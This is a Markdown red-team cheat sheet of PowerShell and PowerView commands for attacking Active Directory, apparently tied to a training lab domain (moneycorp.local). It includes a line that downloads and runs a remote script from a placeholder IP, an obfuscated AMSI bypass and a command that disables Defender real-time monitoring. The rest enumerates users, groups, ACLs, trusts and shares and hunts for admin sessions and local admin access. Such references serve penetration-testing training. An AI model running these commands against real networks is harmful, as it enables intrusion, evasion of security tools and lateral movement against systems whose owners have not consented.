# Red-team-cheatsheet

# Summary
* [General](#General)
* [Domain Enumeration](#Domain-Enumeration)
    * [Powerview Domain](#Powerview-Domain)
    * [Powerview Domain](#Powerview-users,-groups-and-computers)
    * [Powerview Domain](#Powerview-shares)
    * [Powerview GPO](#Powerview-GPO)
    * [Powerview ACL](#Powerview-ACL)
    * [Powerview Domain Trust](#Powerview-Domain-Trust)
    * [Powerview Misc](#Powerview-Misc)

# General
#### Connect to machine with administrator privs
```
Enter-PSSession -Computername <computername>
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

#### Execute commands on a machine
```
Invoke-Command -Computername <computername> -Scriptblock {whoami} 
Invoke-Command -Scriptblock {whoami} $sess
```

#### Load script on a machine
```
Invoke-Command -Computername <computername> -FilePath "<path>"
Invoke-Command -FilePath "<path>" $sess
```

#### Download and load script on a machine
```
iex (iwr http://xxx.xxx.xxx.xxx/<scriptname> -UseBasicParsing)
```

#### AMSI Bypass
```
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

#### Disable AV monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

# Domain Enumeration
## Powerview Domain
```
. C:\ad\tools\PowerView.ps1
```

#### Get current domain
```
Get-NetDomain
```

#### Get object of another domain
```
Get-NetDomain -Domain <domainname>
Get-NetDomain -Domain moneycorp.local
```

#### Get Domain SID for the current domain
```
Get-DomainSID
```

#### Get the domain policy
```
Get-DomainPolicy
```

## Powerview users, groups and computers
#### Information of domain controller
```
Get-NetDomainController
```

#### Get information of users in the domain // list of users
```
Get-NetUser
Get-NetUser -Username student244
Get-NetUser | select samaccountname
```

#### Get list of all properties for users in the current domain
```
get-userproperty -Properties pwdlastset
```

#### Get descripton field from the user
```
Find-UserField -SearchField Description -SearchTerm "built"
```

#### Get computer information
```
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -FullData
Get-NetComputer -fulldata | select samaccountname,operatingsystem
```

#### List all groups of the domain
```
Get-NetGroup
Get-NetGroup -GroupName *admin*
Get-NetGroup -Domain moneycorp.local
```

#### Get all the members of the group
```
Get-NetGroupMember -Groupname "group" -Recurse
Get-NetGroupMember -Groupname "Domain Admins" -Recurse
```

#### Get the group membership of a user
```
Get-NetGroup -Username "student244"
```

#### List all the local groups on a machine (needs admin privs on non dc machines)
```
Get-NetlocalGroup -Computername dcorp-dc.dollarcorp.moneycorp.local -ListGroups
```

#### Get Member of all the local groups on a machine (needs admin privs on non dc machines)
```
Get-NetlocalGroup -Computername dcorp-dc.dollarcorp.moneycorp.local -Recurse
```

#### Get actively logged users on a computer (needs local admin privs)
```
Get-NetLoggedon -Computername <servername>
```

#### Get locally logged users on a computer (needs remote registary rights on the target)
```
Get-LoggedonLocal -Computername dcorp-dc.dollarcorp.moneycorp.local
```

#### Get the last logged users on a computer (needs admin rights and remote registary on the target)
```
Get-LastLoggedOn -ComputerName <servername>
```

## Powerview shares
#### Find shared on hosts in the current domain
```
Invoke-ShareFinder -Verbose
Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC
```

#### Find sensitive files on computers in the domain
```
Invoke-FileFinder -Verbose
```

#### Get all fileservers of the domain
```
Get-NetFileServer
```

## Powerview GPO
#### Get list of GPO's in the current domain
```
Get-NetGPO
Get-NetGPO -Computername dcorp-std244.dollarcorp.moneycorp.local
```

#### Get GPO's which uses restricteds groups or groups.xml for interesting users
```
Get-NetGPOGroup
```

#### Get users which are in a local group of a machine using GPO
```
Find-GPOComputerAdmin -Computername dcorp-std244.dollarcorp.moneycorp.local
```

#### Get machines where the given user is member of a specific group
```
Find-GPOLocation -Username student244 -Verbose
```

#### Get OU's in a domain
```
Get-NetOU -Fulldata
```

#### Get machines t hat are part of an OU
```
Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
```

#### Get GPO applied on an OU
```
Get-NetGPO -GPOname "{Guid}"
```

## Powerview ACL
#### Get the ACL's associated with the specified object
```
Get-ObjectACL -SamAccountName student244 -ResolveGUIDS
```

#### Get the ACL's associated with the specified prefix to be used for search
```
Get-ObjectACL -ADSprefix ‘CN=Administrator,CN=Users’ -Verbose
```

#### Get the ACL's associated with the specified path
```
Get-PathAcl -Path \\dcorp-dc.dollarcorp.moneycorp.local\sysvol
```

#### Search for interesting ACL's
```
Invoke-ACLScanner -ResolveGUIDs
```

#### Search of interesting ACL's for the current user
```
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "student244"}
```

## Powerview Domain trust
#### Get a list of all the domain trusts for the current domain
```
Get-NetDomainTrust
```

#### Get details about the current forest
```
Get-NetForest
```

#### Get all domains in the current forest
```
Get-NetForestDomain
Get-NetforestDomain -Forest eurocorp.local
```

#### Get global catalogs for the current forest
```
Get-NetForestCatalog
Get-NetForestCatalog -Forest eurocorp.local
```

#### Map trusts of a forest
```
Get-NetForestTrust
Get-NetForestTrust -Forest eurocorp.local
Get-NetForestDomain -Verbose | Get-NetDomainTrust
```

## Powerview Misc
####  Find all machines on the current domain where the current user has local admin access
```
Find-LocalAdminAccess -Verbose

. ./Find-WMILocalAdminAccess.ps1
Find-WMILocalAdminAccess
```

####  Find local admins on all machines of the domain (needs admin privs)
```
Invoke-EnumerateLocalAdmin -Verbose

. ./Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess
```

#### Connect to machine with administrator privs
```
Enter-PSSession -Computername <computername>
$sess = New-PSSession -Computername <computername>
Enter-PSSession $sess
```

####  Find computers where a domain admin has sessions
```
Invoke-UserHunter -Groupname "RDPUsers"
Invoke-UserHunter -CheckAccess
```

####  
```

```

